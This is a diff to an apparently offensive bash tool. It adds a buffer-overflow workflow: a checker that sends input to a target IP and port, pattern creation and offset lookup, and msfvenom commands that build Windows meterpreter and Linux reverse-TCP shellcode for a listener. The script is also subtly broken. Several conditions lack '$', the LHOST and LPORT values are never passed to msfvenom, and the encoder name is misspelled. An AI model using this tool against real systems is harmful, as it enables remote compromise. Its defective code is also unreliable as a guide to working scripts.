@@ -85,7 +85,7 @@ if [ "$msfconsole" == "0" ] && [ "$msfvenom" == "0" ] && [ "$nc" == "0" ] && [ "
 		echo ""
 		exit
 fi
-echo -e "\e[5\e[1m\e[31
+echo "\e[5\e[1m\e[31
  __ __    ___  ____    ___   ___ ___       ____    ___  ____     ___  ____    ____  ______   ___   ____  
 |  |  |  /  _]|    \  /   \ |   |   |     /    |  /  _]|    \   /  _]|    \  /    ||      | /   \ |    \ 
 |  |  | /  [_ |  _  ||     || _   _ |    |   __| /  [_ |  _  | /  [_ |  D  )|  o  ||      ||     ||  D  )
@@ -94,7 +94,7 @@ echo -e "\e[5\e[1m\e[31
  \   / |     ||  |  ||     ||   |   |    |     ||     ||  |  ||     ||  .  \|  |  |  |  |  |     ||  .  /
   \_/  |_____||__|__| \___/ |___|___|    |___,_||_____||__|__||_____||__|\_||__|__|  |__|   \___/ |__|\_|                                                                                                      
 \e[0"
-echo -e "\e[35mCoded By: run3\e[0"
+echo "\e[35mCoded By: run3\e[0"
 
 #start
 
@@ -102,7 +102,7 @@ echo -e "\e[34m[1]\e[35m Linux Based Payloads"
 echo -e "\e[34m[2]\e[35m Windows Based Payloads"
 echo -e "\e[34m[3]\e[35m Web Based Payload"
 echo -e "\e[34m[3]\e[35m Android Based Payload"
-echo -e	"\e[34m[4]\e[35m Shellcode Generator for Buffer Overfow \e[0m"
+echo -e	"\e[34m[4]\e[35m Buffer Overfows \e[0m"
 echo ""
 
 read -p "Choose What Number: " option
@@ -366,55 +366,90 @@ fi
 #ShellCode Payload for Buffer overflow 
 if [ $option == 5 ]
 	then
-		echo -e "\e[34m[1]\e[35m Windows"
-		echo -e "\e[34m[2]\e[35m Linux"
-		read -p "What Os you want to generate a shellcode: " shellcode_option
-		if [ $shellcode_option == 1 ]
+		echo -e "\e[34m[1]\e[35m Check the Overflow Value"
+		echo -e "\e[34m[2]\e[35m Create Pattern"
+		echo -e "\e[34m[3]\e[35m Offset Checker"
+		echo -e "\e[34m[4]\e[35m Generate A shellcode\e[0m"
+		read -p "Enter the option you want to use: " buffer_option 
+		if [ $buffer_option == 1 ]
 			then
-				echo -e "\e[34m[1]\e[35m x86"
-				echo -e "\e[34m[2]\e[35m x64"
-				read -p "What is The Architecture:(Choose 1 or 2): " arch_windows_shellcode
-				if [ $arch_windows_shellcode == 1 ]
-					then
-						read -p "Enter Your LHOST(own ip): " lhost
-                		read -p "Enter Your LPORT(Port You want to listen to): " lport
-						read -p "Enter The Bad Characters starting with \x00: " badchars
-						msfvenom -p windows/meterpreter/reverse_tcp -b "$badchars" -f c -a x86 shikita_ga_nai
-						sleep 2
-						echo "Please use multi/handler to listen for the connection"	
-       	 		fi
-				if [ $arch_windows_shellcode == 2 ]
-					then
-						read -p "Enter Your LHOST(own ip): " lhost
-                		read -p "Enter Your LPORT(Port You want to listen to): " lport
-						read -p "Enter The Bad Characters starting with \x00: " badchars
-						msfvenom -p windows/x64/meterpreter/reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
-						sleep 2
-						echo "Please use multi/handler to listen for the connection"
-				fi				
+				read -p "Enter The IP you want to connect to: " ip
+				read -p "Enter the port: " port
+				echo "example Of the prefix (\e[31moverflow\e[0m + 'A' * 50 + '\r\n')"
+				echo " if there is type it" 
+				echo " if there is not leave it blank"
+				read -p "Enter String the prefix:(The Red color) : " String
+				$(python $dir/source/buf_check.py $ip $port $String)
 		fi
-		if [ $shellcode_option == 2 ]
+		if [ $buffer_option == 2 ]
 			then
-				echo -e "\e[34m[1]\e[35m x86"
-				echo -e "\e[34m[2]\e[35m x64"
-				read -p "What is The Architecture:(Choose 1 or 2): " arch_linux_shellcode
-				if [ $arch_linux_shellcode == 1 ]
+				read -p "How many Random Character do you want to generate: "  rand_chars
+				if [ ! -d "$dir/output" ]
 					then
-						read -p "Enter Your LHOST(own ip): " lhost
-                		read -p "Enter Your LPORT(Port You want to listen to): " lport
-						read -p "Enter The Bad Characters starting with \x00: " badchars
-						msfvenom -p linux/x86/shell_reverse_tcp -b "$badchars" -f python -a x86 shikita_ga_nai
-						sleep 2
-						echo "Please use netcat to listen for the connection"	
-				fi
-				if [ $arch_linux_shellcode == 2 ]
-					then
-						read -p "Enter Your LHOST(own ip): " lhost
-                		read -p "Enter Your LPORT(Port You want to listen to): " lport
-						read -p "Enter The Bad Characters starting with \x00: " badchars
-						msfvenom -p linux/x64/shell_reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
-						sleep 2
-						echo "Please use netcat to listen for the connection"	
-				fi
+						mkdir output
+						msf-pattern_create -l $rand_chars >> $dir/rand_chars.txt
+				else		
+						msf-pattern_create -l $rand_chars >> $dir/rand_chars.txt
+				fi		
+		fi		
+		if [ buffer_option == 3 ]
+			then
+				read -p "How many Random Character did you generate: " rand_chars_generated
+				read -p "What is the EIP Value after you send your random characters: " eip_val
+				msf-pattern_offset -l $rand_chars_generated -q $eip_val
 		fi
+		if [ buffer_option == 4 ]
+			then
+				echo -e "\e[34m[1]\e[35m Windows"
+				echo -e "\e[34m[2]\e[35m Linux"
+				read -p "What Os you want to generate a shellcode: " shellcode_option
+				if [ $shellcode_option == 1 ]
+					then
+						echo -e "\e[34m[1]\e[35m x86"
+						echo -e "\e[34m[2]\e[35m x64"
+						read -p "What is The Architecture:(Choose 1 or 2): " arch_windows_shellcode
+						if [ $arch_windows_shellcode == 1 ]
+							then
+								read -p "Enter Your LHOST(own ip): " lhost
+                				read -p "Enter Your LPORT(Port You want to listen to): " lport
+								read -p "Enter The Bad Characters starting with \x00: " badchars
+								msfvenom -p windows/meterpreter/reverse_tcp -b "$badchars" -f c -a x86 shikita_ga_nai
+								sleep 2
+								echo "Please use multi/handler to listen for the connection"	
+       	 				fi			
+						if [ $arch_windows_shellcode == 2 ]
+							then
+								read -p "Enter Your LHOST(own ip): " lhost
+                				read -p "Enter Your LPORT(Port You want to listen to): " lport
+								read -p "Enter The Bad Characters starting with \x00: " badchars
+								msfvenom -p windows/x64/meterpreter/reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
+								sleep 2
+								echo "Please use multi/handler to listen for the connection"
+						fi				
+				fi
+				if [ $shellcode_option == 2 ]
+					then
+						echo -e "\e[34m[1]\e[35m x86"
+						echo -e "\e[34m[2]\e[35m x64"
+						read -p "What is The Architecture:(Choose 1 or 2): " arch_linux_shellcode
+						if [ $arch_linux_shellcode == 1 ]
+							then
+								read -p "Enter Your LHOST(own ip): " lhost
+                				read -p "Enter Your LPORT(Port You want to listen to): " lport
+								read -p "Enter The Bad Characters starting with \x00: " badchars
+								msfvenom -p linux/x86/shell_reverse_tcp -b "$badchars" -f python -a x86 shikita_ga_nai
+								sleep 2
+								echo "Please use netcat to listen for the connection"	
+						fi
+						if [ $arch_linux_shellcode == 2 ]
+							then
+								read -p "Enter Your LHOST(own ip): " lhost
+                				read -p "Enter Your LPORT(Port You want to listen to): " lport
+								read -p "Enter The Bad Characters starting with \x00: " badchars
+								msfvenom -p linux/x64/shell_reverse_tcp -b "$badchars" -f python -a x64 shikita_ga_nai
+								sleep 2
+								echo "Please use netcat to listen for the connection"	
+						fi
+				fi
+		fi		
 fi				
